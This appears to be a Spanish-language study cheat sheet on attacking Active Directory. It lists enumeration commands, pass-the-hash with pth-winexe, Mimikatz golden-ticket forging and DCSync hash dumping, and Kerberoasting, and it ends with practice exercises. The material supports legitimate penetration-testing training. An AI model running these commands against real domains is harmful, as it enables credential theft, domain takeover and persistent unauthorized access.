# Active Directory Attacks

Propietario: Adrian Gisbert Cabello

### 1. Introducción a Active Directory

Active Directory (AD) es un servicio que permite a los administradores de sistemas gestionar sistemas operativos, aplicaciones, usuarios y acceso a datos a gran escala. El controlador de dominio (DC) es el núcleo de AD, almacenando toda la información sobre cómo está configurada la instancia específica de AD y aplicando una variedad de reglas que gobiernan las interacciones dentro del dominio de Windows.

### 2. Enumeración de Active Directory

### 2.1. Enfoque Tradicional

Utilización de herramientas como `net.exe` para enumerar usuarios, grupos y otros recursos del dominio:

- Enumerar usuarios del dominio:
    
    ```bash
    net user /domain
    ```
    
- Enumerar grupos del dominio:
    
    ```bash
    net group /domain
    ```
    

### 2.2. Enfoque Moderno

Utilización de PowerShell para una enumeración más flexible y detallada:

- Obtener información de usuarios:
    
    ```powershell
    Get-ADUser -Filter *
    ```
    
- Enumeración LDAP con PowerShell:
    
    ```powershell
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="samAccountType=805306368"
    $Searcher.FindAll()
    ```
    
- Enumeración de usuarios conectados actualmente:
    
    ```powershell
    Import-Module .\PowerView.ps1
    Get-NetLoggedon -ComputerName [nombre_computadora]
    Get-NetSession -ComputerName [nombre_computadora]
    ```
    
- Enumeración a través de Service Principal Names (SPN):
    
    ```powershell
    $Searcher.filter = "serviceprincipalname=*"
    $Searcher.FindAll()
    ```
    

### 3. Técnicas de Autenticación y Explotación

### 3.1. NTLM Authentication

El protocolo NTLM se utiliza cuando un cliente se autentica con un servidor mediante una dirección IP en lugar de un nombre de host. El proceso incluye la generación y comparación de un hash NTLM.

### 3.2. Kerberos Authentication

Kerberos es el principal protocolo de autenticación utilizado en AD. Involucra la emisión de tickets por un KDC (Key Distribution Center), que los clientes utilizan para autenticar servicios.

### 3.3. Pass the Hash (PtH)

Permite a un atacante autenticarse en un sistema remoto usando un hash NTLM en lugar de la contraseña en texto claro:

```bash
pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:hash //1.1.1.1 cmd
```

### 3.4. Pass the Ticket (PtT)

Esta técnica permite utilizar un ticket Kerberos (TGT) robado para autenticarse en servicios dentro del dominio.

### 3.5. Golden Tickets

Consiste en crear un TGT falso utilizando el hash del krbtgt, lo que permite obtener acceso completo al dominio:

```powershell
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:75b60230a2394a812000dbfad8415965 /id:500
mimikatz # misc::cmd
```

### 4. Movimientos Laterales

### 4.1. Enumeración de Servicios y Usuarios Conectados

```powershell
Get-NetSession -ComputerName dc01
```

### 4.2. Dumping Hashes con DCSync

Utilizar Mimikatz para replicar la base de datos de contraseñas desde un DC:

```powershell
mimikatz # lsadump::dcsync /user:Administrator
```

### 5. Persistencia en Active Directory

### 5.1. Golden Tickets para Persistencia

Crear tickets TGT válidos indefinidamente hasta que se cambie la contraseña de krbtgt:

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:75b60230a2394a812000dbfad8415965 /id:500
mimikatz # misc::cmd
```

### 5.2. Sincronización del Controlador de Dominio

Abusar de la funcionalidad de replicación de AD para extraer hashes de contraseñas sin dejar un rastro directo:

```powershell
mimikatz # lsadump::dcsync /user:Administrator
```

### 6. Ejercicios Prácticos

1. **Enumeración con PowerView**:
    - Ejecutar `Get-NetLoggedOn` y `Get-NetSession` para descubrir usuarios conectados y sesiones activas.
2. **Explotar SPN para Kerberoasting**:
    - Usar `Invoke-Kerberoast` para solicitar y crackear tickets de servicio Kerberos:
        
        ```powershell
        Invoke-Kerberoast -OutputFormat Hashcat
        ```
        
3. **Uso de Mimikatz para Dumping de Hashes**:
    - Ejecutar Mimikatz para obtener hashes NTLM y utilizarlos con Pass the Hash.